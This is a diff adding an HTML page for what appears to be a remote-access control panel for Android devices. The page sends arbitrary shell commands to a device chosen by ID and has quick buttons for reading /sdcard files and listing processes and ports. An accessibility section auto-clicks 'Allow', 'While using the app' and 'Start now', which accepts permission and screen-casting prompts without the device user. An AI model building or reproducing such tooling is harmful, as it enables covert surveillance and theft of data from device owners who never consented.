@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shell Terminal - Remote Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a1a;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            color: #c9d1d9;
+        }
+
+        /* Sidebar Styles */
+        .sidebar {
+            width: 260px;
+            background: #0d1117;
+            border-right: 1px solid #30363d;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            overflow-y: auto;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 1px solid #30363d;
+            background: #161b22;
+        }
+
+        .sidebar-header h2 {
+            font-size: 1.2em;
+            color: #58a6ff;
+        }
+
+        .category {
+            padding: 15px;
+            border-bottom: 1px solid #21262d;
+        }
+
+        .category-title {
+            font-size: 0.85em;
+            text-transform: uppercase;
+            color: #8b949e;
+            margin-bottom: 10px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .cmd-btn {
+            display: block;
+            width: 100%;
+            text-align: left;
+            padding: 8px 12px;
+            background: transparent;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+            border-radius: 6px;
+            margin-bottom: 6px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.2s;
+        }
+
+        .cmd-btn:hover {
+            background: #21262d;
+            border-color: #8b949e;
+        }
+
+        .cmd-btn.primary {
+            border-color: #238636;
+            color: #3fb950;
+        }
+
+        .cmd-btn.primary:hover {
+            background: #1a2e23;
+        }
+
+        /* Main Content Styles */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background: #1a1a1a;
+            height: 100%;
+        }
+
+        header {
+            padding: 15px 20px;
+            background: #161b22;
+            border-bottom: 1px solid #30363d;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        h1 {
+            font-size: 1.2em;
+            font-weight: 500;
+        }
+
+        .terminal-container {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            background: #0d1117;
+            margin: 0;
+            font-family: 'Courier New', monospace;
+        }
+
+        .output-line {
+            line-height: 1.5;
+            margin-bottom: 4px;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .error-line {
+            color: #ff7b72;
+        }
+
+        .command-line {
+            color: #79c0ff;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .info-line {
+            color: #8b949e;
+            font-style: italic;
+        }
+
+        .input-area {
+            padding: 15px 20px;
+            background: #161b22;
+            border-top: 1px solid #30363d;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .prompt {
+            color: #3fb950;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+        }
+
+        #command-input {
+            flex: 1;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 1em;
+            outline: none;
+        }
+
+        #command-input:focus {
+            border-color: #58a6ff;
+        }
+
+        .btn {
+            padding: 8px 16px;
+            border-radius: 6px;
+            border: 1px solid rgba(27, 31, 35, 0.15);
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .btn-primary {
+            background: #238636;
+            color: white;
+            border-color: rgba(27, 31, 35, 0.15);
+        }
+
+        .btn-primary:hover {
+            background: #2ea043;
+        }
+
+        .btn-secondary {
+            background: #21262d;
+            color: #c9d1d9;
+            border: 1px solid #30363d;
+        }
+
+        .btn-secondary:hover {
+            background: #30363d;
+            boarder-color: #8b949e;
+        }
+
+        .back-link {
+            text-decoration: none;
+            color: #c9d1d9;
+            font-size: 0.9em;
+            padding: 5px 10px;
+            border-radius: 4px;
+            background: #21262d;
+        }
+
+        .back-link:hover {
+            background: #30363d;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <h2>Quick Commands</h2>
+        </div>
+
+        <!-- Category: Accessibility -->
+        <div class="category">
+            <div class="category-title">Accessibility (No Root)</div>
+            <button class="cmd-btn primary" onclick="populate('acc click &quot;Allow&quot;')">✅ Accept
+                Permission</button>
+            <button class="cmd-btn primary" onclick="populate('acc click &quot;While using the app&quot;')">📍 While
+                Using App</button>
+            <button class="cmd-btn primary" onclick="populate('acc click &quot;Start now&quot;')">🎥 Start
+                Casting</button>
+            <button class="cmd-btn" onclick="populate('acc click &quot;TEXT_HERE&quot;')">👆 Custom Click...</button>
+        </div>
+
+        <!-- Category: Files -->
+        <div class="category">
+            <div class="category-title">File Operations</div>
+            <button class="cmd-btn" onclick="run('ls -la /sdcard')">📂 List /sdcard</button>
+            <button class="cmd-btn" onclick="run('pwd')">📍 Current Dir</button>
+            <button class="cmd-btn" onclick="populate('cat /sdcard/')">📄 Read File...</button>
+            <button class="cmd-btn" onclick="populate('mkdir /sdcard/')">📁 Make Dir...</button>
+        </div>
+
+        <!-- Category: System -->
+        <div class="category">
+            <div class="category-title">System Diagnostics</div>
+            <button class="cmd-btn" onclick="run('getprop ro.product.model && getprop ro.build.version.release')">📱
+                Device Info</button>
+            <button class="cmd-btn" onclick="run('df -h')">💾 Disk Usage</button>
+            <button class="cmd-btn" onclick="run('ps -A')">📊 Process List</button>
+            <button class="cmd-btn" onclick="run('top -n 1')">⚡ CPU Usage</button>
+        </div>
+
+        <!-- Category: Network -->
+        <div class="category">
+            <div class="category-title">Network</div>
+            <button class="cmd-btn" onclick="run('ip addr show wlan0')">🌐 IP Address</button>
+            <button class="cmd-btn" onclick="run('ping -c 3 google.com')">📶 Ping Google</button>
+            <button class="cmd-btn" onclick="run('netstat -an | grep LISTEN')">🔌 Open Ports</button>
+        </div>
+
+        <!-- Tools -->
+        <div class="category">
+            <div class="category-title">Tools</div>
+            <button class="cmd-btn" id="btn-clear">🧹 Clear Terminal</button>
+        </div>
+    </aside>
+
+    <!-- MAIN CONTENT -->
+    <div class="main-content">
+        <header>
+            <h1>💻 Remote Shell</h1>
+            <a href="index.html" class="back-link">← Back to Dashboard</a>
+        </header>
+
+        <div class="terminal-container" id="terminal">
+            <!-- Output goes here -->
+        </div>
+
+        <div class="input-area">
+            <span class="prompt">$</span>
+            <input type="text" id="command-input" placeholder="Enter command..." autofocus autocomplete="off" />
+            <button class="btn btn-primary" id="btn-execute">Execute</button>
+        </div>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        const terminal = document.getElementById('terminal');
+        const commandInput = document.getElementById('command-input');
+        const commandHistory = [];
+        let historyIndex = -1;
+
+        if (!deviceId) {
+            window.location.href = 'index.html';
+        }
+
+        // --- Core Functions ---
+
+        function addOutput(text, type = 'output') {
+            const line = document.createElement('div');
+            line.className = type === 'error' ? 'output-line error-line' :
+                type === 'command' ? 'command-line' :
+                    type === 'info' ? 'output-line info-line' : 'output-line';
+            line.textContent = text;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        async function executeCommand(command) {
+            if (!command || !command.trim()) return;
+
+            // Add to history
+            commandHistory.push(command);
+            historyIndex = commandHistory.length;
+
+            addOutput(`$ ${command}`, 'command');
+
+            try {
+                const result = await api.sendCommand(deviceId, 'shell_exec', { command });
+
+                if (result.status === 'timeout') {
+                    addOutput(`[Timeout] ${result.error}`, 'error');
+                } else if (result.output) {
+                    addOutput(result.output);
+                } else if (result.stdout || result.stderr) {
+                    if (result.stdout) addOutput(result.stdout);
+                    if (result.stderr) addOutput(result.stderr, 'error');
+                } else {
+                    addOutput('(Command executed - no output)', 'info');
+                }
+            } catch (error) {
+                addOutput(`Error: ${error.message}`, 'error');
+            }
+        }
+
+        // --- Toolbar Helpers ---
+
+        // Called by sidebar buttons to populate input
+        window.populate = function (cmd) {
+            commandInput.value = cmd;
+            commandInput.focus();
+        }
+
+        // Called by sidebar buttons to run immediately
+        window.run = function (cmd) {
+            executeCommand(cmd);
+        }
+
+        // --- Event Listeners ---
+
+        // Execute button
+        document.getElementById('btn-execute').addEventListener('click', () => {
+            const command = commandInput.value;
+            executeCommand(command);
+            commandInput.value = '';
+        });
+
+        // Clear button
+        document.getElementById('btn-clear').addEventListener('click', () => {
+            terminal.innerHTML = '';
+            addOutput('Terminal cleared.', 'info');
+        });
+
+        // Input History (Up/Down) & Enter
+        commandInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const command = commandInput.value;
+                executeCommand(command);
+                commandInput.value = '';
+            } else if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    commandInput.value = commandHistory[historyIndex];
+                }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    commandInput.value = commandHistory[historyIndex];
+                } else {
+                    historyIndex = commandHistory.length;
+                    commandInput.value = '';
+                }
+            }
+        });
+
+        // Initial connection message
+        addOutput('=== Remote Shell Terminal ===', 'info');
+        addOutput(`Connected to: ${deviceId}`, 'info');
+        addOutput('Type commands or use the Quick Menu on the left.', 'info');
+        addOutput('');
+
+    </script>
+</body>
+
+</html>
